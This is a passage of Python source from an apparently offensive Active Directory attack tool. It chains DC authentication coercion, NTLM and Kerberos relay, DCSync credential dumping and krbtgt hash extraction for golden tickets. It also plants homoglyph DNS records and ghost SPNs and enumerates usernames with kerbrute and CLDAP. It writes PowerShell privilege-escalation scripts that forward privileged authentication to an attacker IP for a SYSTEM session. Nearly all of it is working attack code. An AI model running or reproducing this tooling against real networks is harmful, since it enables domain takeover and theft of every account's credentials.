        log.warning("PrinterBug not found, skipping")
        return False
    if cfg.nthash:
        auth = f"{cfg.domain}/{cfg.username}@{cfg.dc_ip} -hashes :{cfg.nthash}"
    else:
        auth = f"{cfg.domain}/{cfg.username}:{cfg.password}@{cfg.dc_ip}"
    parts = cmd.split() + auth.split() + [listener]
    result = run(parts, cfg, timeout=60, outfile=outfile)
    return _check_coerce_output(result, outfile)


def _coerce_dfscoerce(listener: str, cfg: Config, outfile: Path) -> bool:
    cmd = find_tool(
        "dfscoerce.py", "DFSCoerce.py",
        paths=[TOOLS_DIR / "DFSCoerce" / "dfscoerce.py"]
    )
    if not cmd:
        log.warning("DFSCoerce not found, skipping")
        return False
    parts = cmd.split() + _build_coerce_auth(cfg) + [listener, cfg.dc_ip]
    result = run(parts, cfg, timeout=60, outfile=outfile)
    return _check_coerce_output(result, outfile)


def _coerce_shadowcoerce(listener: str, cfg: Config, outfile: Path) -> bool:
    cmd = find_tool(
        "shadowcoerce.py", "ShadowCoerce.py",
        paths=[TOOLS_DIR / "ShadowCoerce" / "shadowcoerce.py"]
    )
    if not cmd:
        log.warning("ShadowCoerce not found, skipping")
        return False
    parts = cmd.split() + _build_coerce_auth(cfg) + [listener, cfg.dc_ip]
    result = run(parts, cfg, timeout=60, outfile=outfile)
    return _check_coerce_output(result, outfile)


def _coerce_coercer(listener: str, cfg: Config, outfile: Path) -> bool:
    if not tool_exists("coercer"):
        log.warning("Coercer not found (pip install coercer)")
        return False
    auth = _build_coerce_auth(cfg)
    parts = ["coercer", "coerce"] + auth + ["--listener", listener, "--target", cfg.dc_ip]
    result = run(parts, cfg, timeout=120, outfile=outfile)
    return _check_coerce_output(result, outfile)


def _check_coerce_output(result: subprocess.CompletedProcess, outfile: Path) -> bool:
    text = result.stdout or ""
    if outfile.exists():
        text += outfile.read_text()
    return bool(re.search(r"triggered|success|got.*handle|vulnerable", text, re.IGNORECASE))


def dcsync_attack(already_exploited: str, cfg: Config):
    """DC compromise: relay listener → coerce DC auth → DCSync.

    The DCSync itself ALWAYS targets cfg.dc_ip — see _run_secretsdump().
    The `already_exploited` parameter is purely a "skip-redo" hint: it
    names the host the upstream chain has already compromised, so that
    if the chosen delegation host happens to be the same one we don't
    re-run exploit_target() on it. If they differ, this function will
    compromise the delegation host now.

    Args:
        already_exploited: host the caller already gained code-execution
            on (typically the auto-selected best_target from
            enumerate_targets() / high-value-targets.txt). May be empty
            string if the caller hasn't exploited anything yet.
        cfg: shared config; cfg.dc_ip and cfg.auth_string drive the
            actual secretsdump.
    """
    phase_header("PHASE 3: DOMAIN CONTROLLER COMPROMISE")

    # Find delegation host (the one we'll coerce DC auth through)
    deleg_host = ""
    hv_file = cfg.work_dir / "high-value-targets.txt"
    uc_file = cfg.work_dir / "unconstrained-hosts.txt"
    if hv_file.exists():
        deleg_host = _first_line(hv_file.read_text())
        if deleg_host:
            ok(f"🎯 Using high-value target (relay + delegation): {deleg_host}")
    elif uc_file.exists():
        line = _first_line(uc_file.read_text())
        deleg_host = line.split()[0] if line.split() else ""

    if not deleg_host:
        log.warning("No unconstrained delegation host found")
        log.warning("Attempting direct DCSync with current credentials...")
        _run_secretsdump(cfg)
        return

    ok(f"Using delegation host: {deleg_host}")

    # If the upstream chain hasn't already exploited the delegation host,
    # compromise it now — needed so we can stage relay/coercion from it.
    if deleg_host != already_exploited:
        log.info(f"🔓 Exploiting delegation host {deleg_host}...")
        if not exploit_target(deleg_host, cfg):
            log.error("Failed to compromise delegation host")
            log.warning("Attempting direct DCSync anyway...")
            _run_secretsdump(cfg)
            return

    if cfg.dry_run:
        log.warning("Dry run — would start relay → coerce DC → DCSync")
        return

    # Start ntlmrelayx listener BEFORE coercion
    log.info("🎣 Starting ntlmrelayx listener for DC authentication...")
    relay_output = cfg.work_dir / "dc-relay.txt"
    relay_proc = run(
        ["impacket-ntlmrelayx", "-t", cfg.dc_ip, "-smb2support", "--no-http-server"],
        cfg, bg=True, outfile=relay_output
    )

    if not hasattr(relay_proc, 'poll'):
        log.error("Failed to start ntlmrelayx for DCSync relay")
        log.warning("Attempting direct DCSync instead...")
        _run_secretsdump(cfg)
        return

    time.sleep(2)
    if relay_proc.poll() is not None:
        log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
        log.warning("Attempting direct DCSync instead...")
        _run_secretsdump(cfg)
        return

    ok(f"ntlmrelayx listener running (PID: {relay_proc.pid})")

    try:
        # Coerce DC
        log.info("🔨 Coercing DC authentication (with fallback methods)...")
        coercion_ok = try_dc_coercion(deleg_host, cfg)

        if coercion_ok:
            log.info("⏳ Waiting for relay to process captured auth...")
            time.sleep(5)

        # Check relay output
        if relay_output.exists():
            content = relay_output.read_text()
            if re.search(r"authenticated|SAM|NTDS|success", content, re.IGNORECASE):
                ok("🎣 Relay captured DC authentication!")
    finally:
        # Always stop the relay process
        try:
            relay_proc.terminate()
            relay_proc.wait(timeout=5)
        except Exception:
            try:
                relay_proc.kill()
            except Exception:
                pass
        if relay_proc in cfg.bg_processes:
            cfg.bg_processes.remove(relay_proc)

    # DCSync
    _run_secretsdump(cfg)


def _run_secretsdump(cfg: Config):
    log.info("🗝️  Attempting DCSync...")
    dump_file = cfg.work_dir / "secretsdump.txt"

    # Use DC IP as target (FQDN may not resolve from attacker box)
    target = cfg.dc_ip or cfg.dc_fqdn
    args = [
        "impacket-secretsdump",
        f"{cfg.auth_string}@{target}",
        "-dc-ip", cfg.dc_ip, "-just-dc"
    ]
    if cfg.nthash:
        args += ["-hashes", f":{cfg.nthash}"]

    result = run(args, cfg, timeout=300, outfile=dump_file)
    print(result.stdout[-3000:] if len(result.stdout) > 3000 else result.stdout)

    _check_dcsync_result(cfg)


def _check_dcsync_result(cfg: Config):
    dump_file = cfg.work_dir / "secretsdump.txt"
    if dump_file.exists() and ":::" in dump_file.read_text():
        content = dump_file.read_text()
        hash_count = content.count(":::")
        success_box("DCSync SUCCESSFUL — Domain Compromised!")
        ok(f"Extracted {hash_count} credential entries")
        detail(f"📁 Hashes saved to: {dump_file}")

        # krbtgt
        for line in content.splitlines():
            if line.startswith("krbtgt:"):
                print(f"\n{C.BOLD_YELLOW}  👑 krbtgt hash recovered — GOLDEN TICKET possible:{C.NC}")
                print(f"{C.BOLD}  {line}{C.NC}")
                break
    else:
        fail_box("DCSync did not return hashes")
        log.warning("If you captured a TGT via Rubeus, convert and use:")
        detail(f"export KRB5CCNAME={cfg.work_dir}/dc_tgt.ccache")
        detail(f"impacket-secretsdump -k -no-pass {cfg.dc_fqdn}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DNS Cleanup
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def cleanup_dns_records(cfg: Config):
    if cfg.no_cleanup:
        log.warning("Skipping DNS cleanup (--no-cleanup)")
        return

    # Discover injected records first — no point complaining about a missing
    # tool when the chain didn't inject anything in the first place
    records = []
    for f in cfg.work_dir.glob("exploit-*.txt"):
        content = f.read_text()
        matches = re.findall(r"(?:Adding DNS record[:\s]+|record.*name[:\s]+)(\S+)", content)
        records.extend(matches)
    # Unicode-homoglyph DNS records (Synacktiv 2026 chain) are written to
    # unicode-dns-*.txt by register_unicode_dns_record(); they need cleanup
    # too or the homoglyph hostname stays pointed at attacker forever.
    for f in cfg.work_dir.glob("unicode-dns-*.txt"):
        content = f.read_text()
        # The success log line shape is "...record <homoglyph> -> <attacker_ip>"
        for m in re.finditer(r"\brecord\s+(\S+)\s*(?:->|=>|to)\s*\d+\.\d+\.\d+\.\d+", content):
            records.append(m.group(1))

    if not records:
        return  # nothing to clean — stay quiet

    log.info("🧹 Cleaning up injected DNS records...")

    dnstool = find_tool(
        "dnstool.py",
        paths=[CVE_DIR / "dnstool.py", TOOLS_DIR / "krbrelayx" / "dnstool.py"]
    )
    if not dnstool:
        log.warning(f"dnstool.py not found — cannot auto-cleanup {len(set(records))} DNS record(s)")
        return

    for record in set(records):
        log.info(f"🗑️  Removing DNS record: {record}")
        parts = dnstool.split() + ["-u", cfg.auth_string, "-dc-ip", cfg.dc_ip,
                                    "-a", "remove", "-r", record]
        run(parts, cfg, timeout=30)

    ok("DNS cleanup complete")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Authentication Reflection Bypass (Synacktiv 2026 — CVE-2026-24294 / 26128,
# CVE-2025-58726 ghost-SPN, Unicode-SPN Kerberos reflection)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _make_unicode_homoglyph(name: str) -> str:
    """Substitute ASCII chars with Unicode homoglyphs that LCMapStringEx
    normalizes back to ASCII (so Kerberos issues a TGS for the real host)
    but DnsCache CompareStringW treats as distinct (so DNS resolves the
    homoglyph record to attacker). Only the FIRST occurrence of each char
    is substituted — keeping the diff minimal makes the collision more
    likely to survive case folding / locale variation across patch levels."""
    out = []
    used = set()
    for ch in name:
        if ch in UNICODE_HOMOGLYPHS and ch not in used:
            out.append(UNICODE_HOMOGLYPHS[ch])
            used.add(ch)
        else:
            out.append(ch)
    return "".join(out)


def register_unicode_dns_record(spn_target: str, cfg: Config) -> Optional[str]:
    """Register an ADIDNS record for a Unicode-homoglyph variant of the
    target hostname pointing to the attacker. Returns the homoglyph FQDN
    or None on failure. dnstool.py from krbrelayx is reused; the chain's
    standard cleanup_dns_records() picks up the record on exit."""
    dnstool = find_tool(
        "dnstool.py",
        paths=[KRBRELAYX_DIR / "dnstool.py", CVE_DIR / "dnstool.py"]
    )
    if not dnstool:
        log.error("dnstool.py not found — cannot register Unicode DNS record")
        log.error("Install krbrelayx: git clone https://github.com/dirkjanm/krbrelayx /opt/tools/krbrelayx")
        return None

    if not cfg.has_creds:
        log.error("Unicode-SPN reflection requires credentials (need DC LDAP write to inject A record)")
        return None

    homoglyph = _make_unicode_homoglyph(spn_target)
    if homoglyph == spn_target:
        log.warning(f"No homoglyph substitutions applied to {spn_target} — chars not in table")
        return None

    log.info(f"📝 Registering Unicode A-record: {homoglyph} -> {cfg.attacker_ip}")
    cmd = dnstool.split() + [
        "-u", cfg.auth_string, "-dc-ip", cfg.dc_ip,
        "-a", "add", "-r", homoglyph, "-d", cfg.attacker_ip, "-t", "A",
    ]
    out_file = cfg.work_dir / f"unicode-dns-{datetime.now():%H%M%S}.txt"
    result = run(cmd, cfg, timeout=30, outfile=out_file)
    if result.returncode != 0:
        log.warning(f"dnstool add failed: {_first_line(result.stderr or '')}")
        return None
    ok(f"Unicode DNS record registered: {homoglyph}")
    return homoglyph


def run_kerberos_reflection(target_fqdn: str, cfg: Config) -> bool:
    """Kerberos AP-REQ reflection via Unicode-SPN collision (Synacktiv blog
    Part 2). Coerces target → krbrelayx receives AP-REQ for the homoglyph
    SPN → relays to the real target's SMB. Requires a krbrelayx fork that
    accepts Unicode `sname` matching (operator must apply the LCMapStringEx
    normalization patch — public PoC not yet released)."""
    phase_header(f"KERBEROS REFLECTION via Unicode SPN ({target_fqdn})")

    if not (KRBRELAYX_DIR / "krbrelayx.py").exists():
        log.error(f"krbrelayx not found at {KRBRELAYX_DIR}")
        return False

    homoglyph = register_unicode_dns_record(target_fqdn, cfg)
    if not homoglyph:
        return False

    log.warning("⚠️  Standard krbrelayx does NOT match Unicode SPNs — apply the")
    log.warning("    LCMapStringEx normalization patch to krbrelayx.py first.")
    log.warning("    Synacktiv's blog (May 2026, Part 2) describes the patch;")
    log.warning("    no public fork at time of writing.")

    # Start patched krbrelayx listening for AP-REQ; relay to real target SMB.
    out_file = cfg.work_dir / f"kerb-reflect-{target_fqdn}.txt"
    relay_cmd = [
        "python3", str(KRBRELAYX_DIR / "krbrelayx.py"),
        "-t", f"smb://{target_fqdn}",
        "--smb2support",
    ]
    if cfg.nthash:
        relay_cmd += ["--hashes", f":{cfg.nthash}", "-u", cfg.username]
    elif cfg.password:
        relay_cmd += ["--krbpass", f"{cfg.username}:{cfg.password}"]
    relay_proc = run(relay_cmd, cfg, bg=True, outfile=out_file)
    if not relay_proc or (hasattr(relay_proc, "returncode") and relay_proc.returncode != 0):
        log.error("krbrelayx failed to start")
        return False
    ok(f"krbrelayx listener up (PID: {getattr(relay_proc, 'pid', '?')})")

    # Coerce the *target host* (not the DC) — the AP-REQ listens for the
    # homoglyph SPN. PetitPotam.py: <listener> <target>.
    log.info(f"🔨 Coercing {target_fqdn} → \\\\{homoglyph}\\share\\foo")
    coerce_outfile = cfg.work_dir / f"kerb-reflect-coerce-{target_fqdn}.txt"
    petitpotam = find_tool(
        "impacket-PetitPotam", "PetitPotam.py",
        paths=[Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py"),
               TOOLS_DIR / "PetitPotam" / "PetitPotam.py"],
    )
    if petitpotam:
        coerce_cmd = petitpotam.split() + _build_coerce_auth(cfg) + [homoglyph, target_fqdn]
        run(coerce_cmd, cfg, timeout=60, outfile=coerce_outfile)

    time.sleep(15)
    relay_output = out_file.read_text() if out_file.exists() else ""
    if "Authenticating against" in relay_output or "Target system" in relay_output:
        ok(f"Kerberos reflection succeeded against {target_fqdn}")
        return True
    log.warning("No relay activity — check krbrelayx output for Unicode-SPN match failures")
    return False


def detect_loopback_candidates(cfg: Config, smb_enum_path: Path) -> list[str]:
    """Parse nxc SMB enumeration output for OS strings that indicate
    potential CVE-2026-24294 / 26128 LPE candidates (Server 2025, Win11
    24H2, pre-March-2026 build). Saves matches to loopback-candidates.txt
    so the operator can target reflect-tcpport / reflect-loopback there."""
    if cfg.no_loopback_check or not smb_enum_path.exists():
        return []

    candidates = []
    for line in smb_enum_path.read_text().splitlines():
        if any(hint in line for hint in LOOPBACK_VULNERABLE_OS_HINTS):
            m = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
            if m and m.group(1) not in candidates:
                candidates.append(m.group(1))

    if candidates:
        out = cfg.work_dir / "loopback-candidates.txt"
        out.write_text("\n".join(candidates) + "\n")
        ok(f"📋 {len(candidates)} loopback-LPE candidate(s) (CVE-2026-24294/26128)")
        for c in candidates:
            detail(f"{c} — try --phase reflect-tcpport or reflect-loopback")
    return candidates


def try_ghost_spn_upgrade(target_machine: str, cfg: Config) -> bool:
    """CVE-2025-58726: after relaying to LDAP and obtaining SPN-write rights
    on a target machine account, plant a ghost SPN, then trigger a Kerberos
    coercion to that SPN — DC issues TGS the attacker can decrypt + relay.
    Opportunistic: only fires when bloodyAD reports SPN-write success."""
    if cfg.no_ghost_spn or not cfg.has_creds:
        return False

    if not tool_exists("bloodyAD"):
        log.warning("bloodyAD not found — skipping ghost-SPN upgrade")
        return False

    log.info(f"👻 Attempting CVE-2025-58726 ghost-SPN on {target_machine}")
    ghost_spn = f"HOST/ghost-{int(time.time())}.{cfg.domain}"

    out_file = cfg.work_dir / f"ghost-spn-{target_machine}.txt"

    # 1) Set TRUSTED_FOR_DELEGATION on the target. Check the rc — if this
    # fails (e.g. SeEnableDelegation missing) the rest of the chain is
    # pointless, so abort cleanly instead of silently proceeding.
    uac_cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + [
        "add", "uac", target_machine, "-f", "TRUSTED_FOR_DELEGATION",
    ]
    uac_result = run(uac_cmd, cfg, timeout=30, outfile=out_file)
    if uac_result.returncode != 0:
        log.warning(f"UAC TRUSTED_FOR_DELEGATION write failed on {target_machine} — "
                    f"skipping ghost-SPN (need SeEnableDelegation)")
        return False

    spn_cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + [
        "set", "object", target_machine, "servicePrincipalName", "-v", ghost_spn,
    ]
    result = run(spn_cmd, cfg, timeout=30, outfile=out_file)
    if result.returncode != 0:
        log.warning(f"Ghost-SPN write failed (need SPN-write rights on {target_machine})")
        # Roll back the UAC change since the SPN side never landed.
        if not cfg.no_cleanup and tool_exists("bloodyAD"):
            run(["bloodyAD"] + _bloody_auth_args(cfg) +
                ["remove", "uac", target_machine, "-f", "TRUSTED_FOR_DELEGATION"],
                cfg, timeout=30)
        return False

    ok(f"Ghost SPN planted: {ghost_spn}")
    detail(f"Trigger Kerberos coercion to {ghost_spn} → krbtgt-encrypted TGS issued")
    detail(f"Decrypt with {target_machine}$ key and relay (krbrelayx --aesKey)")
    detail(f"Cleanup: bloodyAD remove object {target_machine} servicePrincipalName -v {ghost_spn}")
    detail(f"         bloodyAD remove uac {target_machine} -f TRUSTED_FOR_DELEGATION")
    return True


def run_reflect_tcpport(cfg: Config) -> bool:
    """CVE-2026-24294 LPE — generates the operator script for the foothold
    (Win11 24H2 / Server 2025 pre-March-2026). The Kali side hosts a relay
    listener; the operator runs the generated PowerShell on the foothold to
    spawn a local SMB server on a high port, mount it via `net use`, then
    coerce LSASS — TCP reuse forwards the privileged auth to the attacker
    listener which relays it back to the real SMB → SYSTEM."""
    phase_header(f"CVE-2026-24294 LPE — SMB-on-tcpport reflection (port {cfg.reflect_port})")

    target_label = cfg.reflect_host or "<foothold>"
    script_path = cfg.work_dir / "reflect-tcpport-trigger.ps1"
    if cfg.dry_run:
        print(f"{C.YELLOW}  [DRY RUN] would write {script_path}{C.NC}")
        return True
    script_path.write_text(f"""# CVE-2026-24294 trigger — run on the {target_label} foothold (admin shell NOT required)
# Prereq: Win11 24H2 or Server 2025, pre-March-2026 patch (no loopback-signing enforcement)
# Usage:  powershell -ExecutionPolicy Bypass -File reflect-tcpport-trigger.ps1

$attacker = '{cfg.attacker_ip}'
$port     = {cfg.reflect_port}

# 1. Mount attacker SMB on arbitrary TCP port (WNetAddConnection4W /tcpport flag)
Write-Host "[*] Mounting \\\\$attacker\\share on TCP $port"
& net use "\\\\$attacker\\share" "/tcpport:$port" /persistent:no

# 2. Coerce LSASS to authenticate to the same UNC (TCP connection reuse)
#    PetitPotam-style local trigger; modify if your Windows build needs a different RPC.
Write-Host "[*] Triggering local privileged auth (LSASS → SMB on port $port)"
$petit = "$env:TEMP\\petit_local.exe"
if (-not (Test-Path $petit)) {{
    Write-Host "[!] Drop a local PetitPotam binary at $petit (e.g., topotam/PetitPotam Release.exe)"
    exit 1
}}
& $petit $env:COMPUTERNAME "\\\\$attacker\\share\\foo"

Write-Host "[+] Done — check attacker-side ntlmrelayx for SYSTEM session on local SMB"
""")
    ok(f"Operator trigger script: {script_path}")

    smb_relay_target = f"{cfg.reflect_host or 'localhost'}:445"
    log.info(f"🎣 Starting ntlmrelayx (port {cfg.reflect_port}) → relay to {smb_relay_target}")
    relay_out = cfg.work_dir / "reflect-tcpport-relay.txt"
    relay_proc = run(
        ["impacket-ntlmrelayx", "-t", f"smb://{smb_relay_target}",
         "-smb2support", "--no-http-server", "--no-wcf-server",
         "--smb-port", str(cfg.reflect_port)],
        cfg, bg=True, outfile=relay_out,
    )
    if not relay_proc:
        return False

    log.warning("⚠️  Stock impacket-smbserver may not parse privileged blobs on")
    log.warning("    a shared TCP connection — Synacktiv blog Part 1 describes the")
    log.warning("    smbserver patch needed. No public PoC at time of writing.")
    detail(f"Drop {script_path.name} on the foothold and execute it")
    detail(f"Watch {relay_out} for SYSTEM session")
    detail("Listener stays up until --poison-duration (default 120s) or Ctrl+C")
    time.sleep(min(cfg.poison_duration, 600))
    return True


def run_reflect_loopback(cfg: Config) -> bool:
    """CVE-2026-26128 LPE — Kerberos loopback variant. Generates an operator
    script that registers the Unicode-SPN DNS record, deploys a local TCP
    forwarder on the foothold, and triggers coercion. The AP-REQ travels
    through the loopback forwarder; loopback-signing-enforcement off ⇒
    privileged SMB session opens locally."""
    phase_header(f"CVE-2026-26128 LPE — Kerberos loopback reflection")

    target_fqdn = cfg.dc_fqdn if cfg.reflect_host == cfg.dc_ip else (cfg.reflect_host or cfg.dc_fqdn)
    if not target_fqdn:
        log.error("--phase reflect-loopback needs --target/-T (foothold FQDN) or --dc-fqdn")
        return False

    homoglyph = register_unicode_dns_record(target_fqdn, cfg)
    if not homoglyph:
        log.warning("Could not register Unicode DNS — operator must inject manually")
        homoglyph = _make_unicode_homoglyph(target_fqdn)

    script_path = cfg.work_dir / "reflect-loopback-trigger.ps1"
    if cfg.dry_run:
        print(f"{C.YELLOW}  [DRY RUN] would write {script_path}{C.NC}")
        return True
    script_path.write_text(f"""# CVE-2026-26128 trigger — run on the {target_fqdn} foothold (admin shell NOT required)
# Prereq: Win11 24H2 or Server 2025, pre-March-2026 patch
# Pair with: krbrelayx (Unicode-SPN patch) on attacker {cfg.attacker_ip}

$homoglyph = '{homoglyph}'
$attacker  = '{cfg.attacker_ip}'

# 1. Local TCP forwarder: 127.0.0.2:88 -> attacker:88 (krbrelayx)
#    netsh portproxy keeps loopback-source IP, satisfying old IP-based checks.
Write-Host "[*] Setting up loopback forwarder 127.0.0.2:88 -> $attacker:88"
& netsh interface portproxy add v4tov4 listenaddress=127.0.0.2 listenport=88 `
    connectaddress=$attacker connectport=88

# 2. Trigger coercion to the homoglyph SPN — DC issues TGS for the real host;
#    AP-REQ goes via loopback → krbrelayx → real SMB.
Write-Host "[*] Coercing local auth to $homoglyph"
$petit = "$env:TEMP\\petit_local.exe"
if (-not (Test-Path $petit)) {{
    Write-Host "[!] Drop a local PetitPotam binary at $petit"
    exit 1
}}
& $petit -pipe efsr $env:COMPUTERNAME "\\\\$homoglyph\\share\\foo"

Write-Host "[+] Done — check attacker-side krbrelayx for SYSTEM session"
Write-Host "[*] Cleanup: netsh interface portproxy delete v4tov4 listenaddress=127.0.0.2 listenport=88"
""")
    ok(f"Operator trigger script: {script_path}")

    if not (KRBRELAYX_DIR / "krbrelayx.py").exists():
        log.error(f"krbrelayx not found at {KRBRELAYX_DIR}")
        return False

    relay_out = cfg.work_dir / "reflect-loopback-relay.txt"
    log.info(f"🎣 Starting krbrelayx (Kerberos AP-REQ on :88) → relay to {target_fqdn}")
    relay_cmd = [
        "python3", str(KRBRELAYX_DIR / "krbrelayx.py"),
        "-t", f"smb://{target_fqdn}",
        "--smb2support",
    ]
    if cfg.has_creds:
        relay_cmd += ["--krbpass", f"{cfg.username}:{cfg.password or ''}"]
    relay_proc = run(relay_cmd, cfg, bg=True, outfile=relay_out)
    if not relay_proc:
        return False

    log.warning("⚠️  krbrelayx needs the Unicode-SPN matching patch (LCMapStringEx")
    log.warning("    normalization). No public fork at time of writing — apply manually.")
    detail(f"Drop {script_path.name} on the foothold and execute it")
    detail(f"Watch {relay_out} for SYSTEM session on {target_fqdn}")
    time.sleep(min(cfg.poison_duration, 600))
    return True


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Pre-cut Credential Discovery (zero-auth foothold finding)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#
# Six zero-auth techniques to find a first credential when classic
# capture (ARP+relay, WPAD poisoning) is degraded by modern controls
# (Defender for Identity, NAC, smart-card-primary auth, strong password
# policy). Each technique is non-fatal — failures log and continue.

# Curated AD-biased username candidate list — TRIED FIRST. Picks high-yield
# enterprise patterns: built-in AD accounts, common admin/service prefixes,
# IT-role names, and the top first names. ~100 entries → fast initial pass.
# If this list yields zero valid users, we fall back to SecLists.
_AD_BIASED_USERS = [
    # Well-known built-in AD accounts
    "Administrator", "Guest", "krbtgt", "DefaultAccount", "WDAGUtilityAccount",
    "HelpAssistant", "Support_388945a0",
    # Admin patterns
    "admin", "administrator", "adm", "domainadmin", "enterpriseadmin",
    "schemaadmin", "sysadmin", "superuser", "root",
    # Service-account prefixes (svc_*)
    "svc", "service", "svcadmin", "svc_admin", "svc_sql", "svc_exchange",
    "svc_backup", "svc_iis", "svc_smtp", "svc_print", "svc_scan",
    "svc_monitoring", "svc_ldap", "svc_sso", "svc_vmware", "svc_sccm",
    "svc_jenkins", "svc_sharepoint", "svc_owa", "svc_adsync", "svc_aad",
    "svc_veeam", "svc_ad",
    # IT roles
    "helpdesk", "ithelp", "support", "it", "itadmin", "networkadmin",
    "netadmin", "security", "soc", "infosec", "audit",
    # Backup / ops / monitoring
    "backup", "backupadmin", "operator", "operations", "ops", "monitor",
    "monitoring", "nagios", "zabbix",
    # Dev / build / test
    "developer", "dev", "devops", "deploy", "build", "jenkins",
    "test", "testuser", "qa", "uat",
    # Database / app
    "sa", "sql", "mssql", "oracle", "postgres", "mysql", "dba", "sqladmin",
    # Apps / platforms
    "exchange", "exchadmin", "sccm", "intune", "vmware", "vcenter",
    "sharepoint", "veeam",
    # Generic / placeholder
    "user", "user1", "user01", "default", "public", "guest1",
    # Top first names (enterprise AD common)
    "alex", "andrew", "anna", "brian", "chris", "daniel", "david",
    "emily", "emma", "james", "jennifer", "john", "joseph", "kevin",
    "mark", "mary", "matthew", "michael", "nicholas", "paul",
    "peter", "richard", "robert", "sarah", "scott", "thomas",
    "timothy", "william",
]

# Built-in micro fallback if neither the curated AD list nor SecLists
# is available (extreme degraded mode).
_BUILTIN_USERS = [
    "administrator", "admin", "guest", "krbtgt", "test", "user",
    "service", "svc", "backup", "operator", "support", "helpdesk",
    "sql", "sqladmin", "mssql", "exchange", "scanner", "printer",
    "vmware", "webmaster", "ftp", "vpn", "wireless", "domainadmin",
]

# Common SecLists locations on Kali for username candidates (fallback tier).
_SECLISTS_USER_PATHS = [
    "/usr/share/seclists/Usernames/Names/names.txt",
    "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
    "/usr/share/wordlists/seclists/Usernames/Names/names.txt",
]


def _load_user_candidates(cfg: Config, *, tier: str = "ad") -> list[str]:
    """Pick a username list. Three tiers, called in escalation order:

      tier="ad"       -> curated AD-biased ~100 list (TRIED FIRST). Skipped
                         if --users-file is given.
      tier="seclists" -> SecLists Names/names.txt (~10K). Used as fallback
                         when the AD-biased pass found nothing.
      tier="builtin"  -> 24-name micro list (extreme degraded mode).

    --users-file always wins regardless of tier.
    """
    if cfg.users_file and Path(cfg.users_file).is_file():
        try:
            return [ln.strip() for ln in Path(cfg.users_file).read_text().splitlines()
                    if ln.strip() and not ln.startswith("#")]
        except OSError as e:
            log.warning(f"Could not read {cfg.users_file}: {e} — falling back")

    if tier == "ad":
        return list(_AD_BIASED_USERS)

    if tier == "seclists":
        for p in _SECLISTS_USER_PATHS:
            if Path(p).is_file():
                log.info(f"Using SecLists user candidates: {p}")
                try:
                    return [ln.strip() for ln in Path(p).read_text().splitlines()
                            if ln.strip() and not ln.startswith("#")]
                except OSError:
                    continue
        log.info("No SecLists installed — using built-in 24-name shortlist")
        return list(_BUILTIN_USERS)

    return list(_BUILTIN_USERS)


def _userenum_kerbrute(cfg: Config, candidates: list[str]) -> list[str]:
    """Kerberos-based user enumeration via kerbrute. Returns valid usernames.

    Output streams directly to terminal (kerbrute has its own progress
    reporting); valid hits are also written via -o for parsing afterwards.
    """
    if not tool_exists("kerbrute"):
        log.info("kerbrute not installed — skipping Kerberos userenum")
        return []
    if not (cfg.dc_ip and cfg.domain):
        log.info("No DC/domain known — skipping kerbrute userenum")
        return []
    cand_file = cfg.work_dir / "userenum-candidates.txt"
    cand_file.write_text("\n".join(candidates) + "\n")
    out_file = cfg.work_dir / "userenum-kerbrute.txt"
    cmd = ["kerbrute", "userenum", "-d", cfg.domain, "--dc", cfg.dc_ip,
           "-o", str(out_file), str(cand_file)]
    log.info(f"🔍 kerbrute userenum ({len(candidates)} candidates) — streaming")
    if cfg.dry_run:
        print(f"  [DRY RUN] {' '.join(cmd)}")
    else:
        try:
            # No capture: kerbrute streams progress directly to operator.
            subprocess.run(cmd, timeout=600, check=False)
        except subprocess.TimeoutExpired:
            log.warning("kerbrute userenum timed out (10min cap)")
        except Exception as e:
            log.warning(f"kerbrute userenum error: {e}")
    valid = []
    if out_file.exists():
        for line in out_file.read_text().splitlines():
            m = re.search(r"VALID USERNAME:\s+(\S+?)@", line)
            if m:
                valid.append(m.group(1))
    if valid:
        ok(f"kerbrute confirmed {len(valid)} valid user(s)")
        for u in valid[:10]:
            detail(u)
    return valid


_CLDAP_MAX_CANDIDATES = 500  # 5s/query × 500 ≈ 42min worst case; usually much less


def _userenum_cldap(cfg: Config, candidates: list[str]) -> list[str]:
    """CLDAP NetLogon ping userenum (sensepost technique). Returns valid users.

    Each CLDAP probe has a 5s socket timeout; large candidate lists
    explode runtime. Cap at _CLDAP_MAX_CANDIDATES — by the time we run
    this, kerbrute has typically already narrowed the list.
    """
    if not tool_exists("userenum-cldap"):
        log.info("userenum-cldap not installed — skipping CLDAP userenum")
        return []
    if not (cfg.dc_ip and cfg.domain):
        log.info("No DC/domain known — skipping CLDAP userenum")
        return []
    if len(candidates) > _CLDAP_MAX_CANDIDATES:
        log.info(f"CLDAP: capping {len(candidates)} -> {_CLDAP_MAX_CANDIDATES} candidates")
        candidates = candidates[:_CLDAP_MAX_CANDIDATES]
    cand_file = cfg.work_dir / "userenum-cldap-input.txt"
    cand_file.write_text("\n".join(candidates) + "\n")
    out_file = cfg.work_dir / "userenum-cldap.txt"
    # Pipe through tee so output streams to operator AND is captured.
    cmd = ["bash", "-c",
           f"userenum-cldap {cfg.dc_ip} {cfg.domain} {cand_file} 2>&1 | tee {out_file}"]
    log.info(f"🔍 CLDAP userenum ({len(candidates)} candidates) — streaming")
    if cfg.dry_run:
        print(f"  [DRY RUN] userenum-cldap {cfg.dc_ip} {cfg.domain} {cand_file}")
    else:
        try:
            subprocess.run(cmd, timeout=900, check=False)
        except subprocess.TimeoutExpired:
            log.warning("CLDAP userenum timed out (15min cap)")
        except Exception as e:
